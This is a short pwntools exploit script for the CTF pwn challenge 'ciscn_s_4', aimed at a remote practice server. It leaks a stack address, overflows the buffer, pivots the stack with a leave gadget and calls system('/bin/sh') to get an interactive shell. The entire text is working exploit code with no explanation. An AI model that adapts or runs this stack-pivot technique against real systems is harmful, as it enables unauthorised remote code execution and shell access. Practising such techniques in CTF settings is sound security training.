from pwn import*
context.log_level = 'debug'

elf = ELF('ciscn_s_4')

#sh = process('./ciscn_s_4')
sh = remote('node3.buuoj.cn',29628)
payload1 = 'A'*0x20 + 'PWN:'
sh.send(payload1)

sh.recvuntil('PWN:')
buf_addr = u32(sh.recv(4)) - 0xe4
print hex(buf_addr)

system = elf.plt['system']
payload = '/bin/sh\x00'
payload += p32(0xdeadbeef)
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(buf_addr+0x20)
payload += p32(0xdeadbeef)
payload = payload.ljust(0x20,'A')
payload += '/bin/sh\x00' 
payload += p32(buf_addr+8)
payload += p32(0x80485fd) #leave
#gdb.attach(sh)
sh.sendline(payload)

sh.interactive()

